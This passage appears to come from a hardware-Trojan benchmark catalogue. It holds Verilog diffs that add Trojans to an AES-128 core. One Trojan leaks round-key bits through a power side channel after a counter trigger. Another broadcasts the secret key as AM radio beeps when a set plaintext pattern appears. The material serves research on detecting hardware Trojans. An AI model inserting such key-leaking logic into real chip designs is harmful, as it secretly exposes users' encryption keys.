+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg4 &lt;= &quot;10101010&quot;;
+			end else if (enable4 == 1) begin
+					SHReg4 &lt;= {SHReg4[0], SHReg4[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg5 &lt;= &quot;10101010&quot;;
+			end else if (enable5 == 1) begin
+					SHReg5 &lt;= {SHReg5[0], SHReg5[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg6 &lt;= &quot;10101010&quot;;
+			end else if (enable6 == 1) begin
+					SHReg6 &lt;= {SHReg6[0], SHReg6[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg7 &lt;= &quot;10101010&quot;;
+			end else if (enable7 == 1) begin
+					SHReg7 &lt;= {SHReg7[0], SHReg7[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg8 &lt;= &quot;10101010&quot;;
+			end else if (enable8 == 1) begin
+					SHReg8 &lt;= {SHReg8[0], SHReg8[7:1]}; 
+			end 
+		end
+
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="406e6510-75c8-492d-8865-8506ede72650" name="t1500" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	After each 128'hFFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF encryptions, the Trojan demonstrates an attack on the AES-128 
	block-cipher and its corresponding key schedule. The idea is to artificially introduce leaking intermediate 
	states in the key schedule that depend on known input bits and key bits, but that naturally would not 
	occur during regular processing of the cipher. The Trojan uses AND conjunctions to pairwise combine each 
	key bit with another input bit. The output of the AND gates are then combined to the leaked intermediate 
	value by XORing all of them. The Trojan leaks one byte of the AES round key for each round of the key schedule. 
	The leakage circuit (LC) is a 16-bit shift register and loaded it with an initial alternating sequence 
	of zeros and ones. The shift register is only enabled in case the input to the leakage circuit is one, 
	which results in an additional dynamic power consumption [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t1500/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1500/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,10 +14,11 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
     input          clk;
     input  [127:0] state, key;
-    output [127:0] out;
+    output [127:0] out;
+	 output [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
     reg    [127:0] s0, k0;
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
@@ -27,7 +28,16 @@ module aes_128(clk, state, key, out);
       begin
         s0 &lt;= state ^ key;
         k0 &lt;= key;
-      end
+      end
+
+	 assign rk1 = k1;
+	 assign rk2 = k2;
+	 assign rk3 = k3;
+	 assign rk4 = k4;
+	 assign rk5 = k5;
+	 assign rk6 = k6;
+	 assign rk7 = k7;
+	 assign rk8 = k8;
 
     expand_key_128
         a1 (clk, k0, k1, k0b, 8&apos;h1),
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t1500/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1500/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1500/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1500/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+	initial begin		clk = 0;
+		state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1500/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1500/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,36 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out
+    );
+
+	wire [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
+	wire Tj_Trig;
+	
+	aes_128 AES  (clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8); 
+	Trojan_Trigger Trigger (rst, out, Tj_Trig);
+	TSC Trojan (rst, clk, Tj_Trig, state, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t1500/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1500/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,50 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] out,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg [127:0] Counter;
+	
+	always @(rst, out)
+	begin
+		if (rst == 1) begin
+			Counter &lt;= 0;
+		end else begin
+			Counter &lt;= Counter + 1;
+		end
+	end
+
+	always @(rst, Counter)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0;
+		end else if (Counter == 128&apos;hffff_ffff_ffff_ffff_ffff_ffff_ffff_ffff) begin
+			Tj_Trig &lt;= 1;
+		end else begin
+			Tj_Trig &lt;= 0;		
+		end
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1500/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1500/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,134 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+	 input rst, clk, Tj_Trig, 
+    input [127:0] state,
+	 input [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8
+    );
+
+	reg enable1, enable2, enable3, enable4, enable5, enable6, enable7, enable8;
+	reg [7:0] SHReg1, SHReg2, SHReg3, SHReg4, SHReg5, SHReg6, SHReg7, SHReg8;
+	always @ (rk1)
+		begin
+			enable1 &lt;= Tj_Trig &amp; ((state[0]&amp;rk1[0])^(state[1]&amp;rk1[1])^(state[2]&amp;rk1[2])^(state[3]&amp;rk1[3])^(state[4]&amp;rk1[4])^(state[5]&amp;rk1[5])^(state[6]&amp;rk1[6])^(state[7]&amp;rk1[7]));
+		end
+	always @ (rk2)
+		begin
+			enable2 &lt;= Tj_Trig &amp; ((state[0]&amp;rk2[0])^(state[1]&amp;rk2[1])^(state[2]&amp;rk2[2])^(state[3]&amp;rk2[3])^(state[4]&amp;rk2[4])^(state[5]&amp;rk2[5])^(state[6]&amp;rk2[6])^(state[7]&amp;rk2[7]));
+		end
+	always @ (rk3)
+		begin
+			enable3 &lt;= Tj_Trig &amp; ((state[0]&amp;rk3[0])^(state[1]&amp;rk3[1])^(state[2]&amp;rk3[2])^(state[3]&amp;rk3[3])^(state[4]&amp;rk3[4])^(state[5]&amp;rk3[5])^(state[6]&amp;rk3[6])^(state[7]&amp;rk3[7]));
+		end
+	always @ (rk4)
+		begin
+			enable4 &lt;= Tj_Trig &amp; ((state[0]&amp;rk4[0])^(state[1]&amp;rk4[1])^(state[2]&amp;rk4[2])^(state[3]&amp;rk4[3])^(state[4]&amp;rk4[4])^(state[5]&amp;rk4[5])^(state[6]&amp;rk4[6])^(state[7]&amp;rk4[7]));
+		end
+	always @ (rk5)
+		begin
+			enable5 &lt;= Tj_Trig &amp; ((state[0]&amp;rk5[0])^(state[1]&amp;rk5[1])^(state[2]&amp;rk5[2])^(state[3]&amp;rk5[3])^(state[4]&amp;rk5[4])^(state[5]&amp;rk5[5])^(state[6]&amp;rk5[6])^(state[7]&amp;rk5[7]));
+		end
+	always @ (rk6)
+		begin
+			enable6 &lt;= Tj_Trig &amp; ((state[0]&amp;rk6[0])^(state[1]&amp;rk6[1])^(state[2]&amp;rk6[2])^(state[3]&amp;rk6[3])^(state[4]&amp;rk6[4])^(state[5]&amp;rk6[5])^(state[6]&amp;rk6[6])^(state[7]&amp;rk6[7]));
+		end
+	always @ (rk7)
+		begin
+			enable7 &lt;= Tj_Trig &amp; ((state[0]&amp;rk7[0])^(state[1]&amp;rk7[1])^(state[2]&amp;rk7[2])^(state[3]&amp;rk7[3])^(state[4]&amp;rk7[4])^(state[5]&amp;rk7[5])^(state[6]&amp;rk7[6])^(state[7]&amp;rk7[7]));
+		end
+	always @ (rk8)
+		begin
+			enable8 &lt;= Tj_Trig &amp; ((state[0]&amp;rk8[0])^(state[1]&amp;rk8[1])^(state[2]&amp;rk8[2])^(state[3]&amp;rk8[3])^(state[4]&amp;rk8[4])^(state[5]&amp;rk8[5])^(state[6]&amp;rk8[6])^(state[7]&amp;rk8[7]));
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg1 &lt;= &quot;10101010&quot;;
+			end else if (enable1 == 1) begin
+					SHReg1 &lt;= {SHReg1[0], SHReg1[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg2 &lt;= &quot;10101010&quot;;
+			end else if (enable2 == 1) begin
+					SHReg2 &lt;= {SHReg2[0], SHReg2[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg3 &lt;= &quot;10101010&quot;;
+			end else if (enable3 == 1) begin
+					SHReg3 &lt;= {SHReg3[0], SHReg3[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg4 &lt;= &quot;10101010&quot;;
+			end else if (enable4 == 1) begin
+					SHReg4 &lt;= {SHReg4[0], SHReg4[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg5 &lt;= &quot;10101010&quot;;
+			end else if (enable5 == 1) begin
+					SHReg5 &lt;= {SHReg5[0], SHReg5[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg6 &lt;= &quot;10101010&quot;;
+			end else if (enable6 == 1) begin
+					SHReg6 &lt;= {SHReg6[0], SHReg6[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg7 &lt;= &quot;10101010&quot;;
+			end else if (enable7 == 1) begin
+					SHReg7 &lt;= {SHReg7[0], SHReg7[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg8 &lt;= &quot;10101010&quot;;
+			end else if (enable8 == 1) begin
+					SHReg8 &lt;= {SHReg8[0], SHReg8[7:1]}; 
+			end 
+		end
+
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="d1b51683-396b-4062-9c57-25118233d40a" name="t1600" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Modulating an (unused) pin on a chip generates an RF signal. This signal can be used to transmit the key bits. 
	This attack is performed at 1560 KHz and can be received with an ordinary AM radio. The data carried by 
	the AM signal needs to be easily interpreted by a human. A beep scheme is utilized where a single beep followed 
	by a pause represents a .0. and a double beep followed by a pause represents a .1.. A description on detail 
	implementation of AM transmission can be found at [1]. In this implementation, the Trojan gets activated when 
	a predefined sequence of input plaintext is observed. 


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Leak Information
 	Location: Processor
	Physical characteristics: Functional


[1] Alex Baumgarten, Michael Steffen, Matthew Clausman, Joseph Zambreno, 
"A case study in hardware Trojan design and implementation," 
International Journal of Information Security, Volume 10, Issue 1, pp 1-14, 2011

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t1600/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1600/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
diff -rupN aes/src/tjfree/AES_tb.v aes/src/tjin-t1600/AES_tb.v
--- aes/src/tjfree/AES_tb.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1600/AES_tb.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,70 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   16:20:11 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/AES_tb.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module AES_tb;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire Antena;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Antena(Antena)
+	);
+
+	initial begin
+		// Initialize Inputs
+		clk = 0;
+		rst = 0;
+		state = 0;
+		key = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;     
+		state = 128&apos;hFFFFFFFF_FFFFFFFF_FFFFFFFF_FFFFFFFF;
+		//state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+      key   = 128&apos;haaaaaaaa_aaaaaaaa_aaaaaaaa_aaaaaaaa;
+
+		#15
+		rst = 0;
+
+		#300 $finish;
+	end
+	
+   always #10.015 clk = ~clk;
+	
+endmodule
+
diff -rupN aes/src/tjfree/AM_Transmission.v aes/src/tjin-t1600/AM_Transmission.v
--- aes/src/tjfree/AM_Transmission.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1600/AM_Transmission.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    11:14:06 03/08/2013 
+// Design Name: 
+// Module Name:    AM_Transmission 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module AM_Transmission(
+    input [127:0] key,
+    input clk,
+    input rst,
+	 input Tj_Trig, 
+    output Antena
+    );
+
+	reg [25:0] Baud8GeneratorACC;
+	reg [127:0] SECRETKey;
+	reg [127:0] SHIFTReg;
+	
+	always @(posedge clk)
+	begin
+		if ((rst == 1&apos;b1) || (Tj_Trig == 1&apos;b1)) begin
+			Baud8GeneratorACC &lt;= 0;
+		end else begin
+			Baud8GeneratorACC &lt;= Baud8GeneratorACC + 1;
+		end
+	end
+	
+	always @(posedge Tj_Trig, posedge Baud8GeneratorACC[25])
+	begin
+		if (Tj_Trig == 1&apos;b1) begin
+			SHIFTReg &lt;= key;
+		end else begin	
+			SHIFTReg &lt;= SHIFTReg &gt;&gt; 1; 
+		end	
+	end
+
+//	always @(posedge rst, posedge Tj_Trig, posedge Baud8GeneratorACC[25])
+//	begin
+//		if ( (rst == 1&apos;b1) || (Tj_Trig == 1&apos;b1) ) begin
+//			SHIFTReg &lt;= key;
+//		end else begin	
+//			SHIFTReg &lt;= SHIFTReg &gt;&gt; 1; 
+//		end	
+//	end
+
+	assign beep1 = !(Baud8GeneratorACC[25] | Baud8GeneratorACC[24] | Baud8GeneratorACC[23]);
+	assign beep2 = !(Baud8GeneratorACC[25] | !(Baud8GeneratorACC[24]) | Baud8GeneratorACC[23]) &amp; SHIFTReg[0];
+	assign beeps = beep1 | beep2;
+	assign MUX_Sel = beeps &amp; Baud8GeneratorACC[15] &amp; Baud8GeneratorACC[4];
+	assign Antena = (MUX_Sel) ? !(rst): 1&apos;b0; 
+
+endmodule
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t1600/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1600/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t1600/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1600/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tb_AM.v aes/src/tjin-t1600/tb_AM.v
--- aes/src/tjfree/tb_AM.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1600/tb_AM.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   11:50:53 03/08/2013
+// Design Name:   AM_Transmission
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/tb_AM.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: AM_Transmission
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_AM;
+
+	// Inputs
+	reg [127:0] key;
+	reg clk;
+	reg rst;
+	reg Tj_Trig;
+	
+	// Outputs
+	wire Antena;
+
+	// Instantiate the Unit Under Test (UUT)
+	AM_Transmission uut (
+		.key(key), 
+		.clk(clk), 
+		.rst(rst), 
+		.Tj_Trig(Tj_Trig),
+		.Antena(Antena)
+	);
+
+	initial begin
+		// Initialize Inputs
+		key = 0;
+		clk = 0;
+		rst = 0;
+		Tj_Trig = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;
+		Tj_Trig = 1;
+		key = 128&apos;hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
+		// Add stimulus here
+		#25
+		Tj_Trig = 0;
+		rst = 0;
+		#300 $finish;
+	end
+	
+   always #10.015 clk = ~clk;
+endmodule
+
diff -rupN aes/src/tjfree/tbTOP.v aes/src/tjin-t1600/tbTOP.v
--- aes/src/tjfree/tbTOP.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1600/tbTOP.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,102 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire Antena;
+	
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out),
+		.Antena(Antena)
+	);
+
+	initial begin		clk = 0;
+		state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t1600/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1600/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
